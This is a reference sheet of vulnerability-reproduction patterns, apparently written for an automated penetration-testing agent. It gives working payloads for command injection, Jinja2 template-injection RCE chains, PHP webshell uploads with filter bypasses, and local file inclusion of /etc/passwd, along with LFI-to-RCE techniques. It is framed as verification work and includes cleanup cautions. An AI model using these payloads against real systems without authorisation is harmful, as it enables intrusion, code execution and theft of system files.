# RCE / File Upload / File Include Reproduction Patterns

## Command Injection

Detect via **out-of-band-optional** time or echo signature:

```python
# echo signature: injected marker must appear in the SAME response, baseline must not
p[inject_key] = "127.0.0.1; echo VULN_MARKER_9f2c"
r = s.get(url + path, params=p, timeout=10)
vuln = "VULN_MARKER_9f2c" in r.text

# time signature: sleep only on the injected branch
p[inject_key] = "127.0.0.1 || sleep 5"
t = time_request(s, url + path, p)            # > baseline + 2.5s ⇒ vulnerable
```

- Separators by shell: `;` `&&` `||` `|` backtick `` ` `` `$(...)` — try in order, stop at first hit
- Windows: `&` and `&&`; `cmd /c` wrappers needed if the binary is not on PATH
- Filtered spaces: `$IFS`, `${IFS}`, tabs; filtered `|`: `%0a` newline chaining
- Never ship a `--reverse-shell` flag in PoC mode — destructive. Mark reverse-shell capability in the report, not the PoC script

## SSTI (Template Injection)

Probe expressions, check the *evaluated* value appears:

```python
p[inject_key] = "{{7*7}}"
r = s.get(url + path, params=p, timeout=10)
if "49" not in r.text:
    p[inject_key] = "${7*7}"
    r = s.get(url + path, params=p, timeout=10)
vuln = "49" in r.text
```

- Jinja2 (Flask): `{{7*7}}` → RCE chain `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` — exploit mode only
- Twig: `{{7*'7'}}` (evaluates to `49` — type coercion distinguishes Twig)
- Freemarker: `<#assign x=7*7>${x}`; Velocity: `#set($x=7*7)$x`
- False positives: some apps echo user input verbatim — require the **evaluated** result (49), not the raw expression

## File Upload (Webshell)

Write a PHP/JSP webshell and verify execution:

```python
files = {"file": ("shell.php", b'<?php echo "VULN_9f2c_".md5("x"); ?>', "application/x-php")}
r = s.post(url + path, files=files, timeout=10)

# parse upload response for the stored URL, then execute the check
m = re.search(r'(https?://[^\s"\']+shell\.php[^\s"\']*)', r.text)
if m:
    r2 = s.get(m.group(1), timeout=10)
    vuln = "VULN_9f2c_" in r2.text
```

- Extension bypasses: `shell.php.jpg`, `shell.phtml`, `shell.php%00.jpg` (legacy), double extension — mirror what the structured block says the Exploit agent confirmed
- Content-Type mismatch is a common filter: send `image/png` header with PHP body
- **Cleanup**: exploit mode MUST delete the uploaded file (`?cmd=rm` or unlink via webshell) — leaving webshells is unacceptable

## Local/Remote File Include

```python
p[inject_key] = "/etc/passwd"
r = s.get(url + path, params=p, timeout=10)
vuln = re.search(r"root:.*:0:0:", r.text) is not None

# wrappers to try when direct path fails: php://filter/convert.base64-encode/resource=index.php
# LFI → RCE (exploit mode): php://input with POST body, /proc/self/environ + User-Agent, log poisoning
```

- Verify **two** signatures: the file content marker AND a missing-file baseline (`/nonexistent` must NOT return the marker)
- Path traversal: `../` must actually leave the webroot — compare `etc/passwd` result with a doubled `....//etc/passwd` (filter bypass) result
